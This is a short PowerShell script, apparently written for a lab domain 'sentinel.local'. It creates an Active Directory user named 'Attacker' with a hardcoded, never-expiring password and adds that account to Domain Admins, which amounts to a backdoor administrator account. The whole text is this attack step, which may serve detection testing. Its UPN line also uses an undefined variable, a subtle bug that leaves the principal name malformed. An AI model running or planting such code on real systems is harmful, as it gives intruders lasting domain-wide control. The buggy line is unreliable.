# Define the new domain user details
$Username = "Attacker"
$Password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$OU = "OU=Users,DC=sentinel,DC=local"  # Replace with the appropriate OU for your domain

# Create a new domain user
New-ADUser -Name $Username -AccountPassword $Password -Path $OU -Enabled $true -PasswordNeverExpires $true -UserPrincipalName "$attacker@sentinel.local" -SamAccountName $Username

# Add the new user to the Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members $Username

Write-Host "User $Username created and added to Domain Admins group successfully."
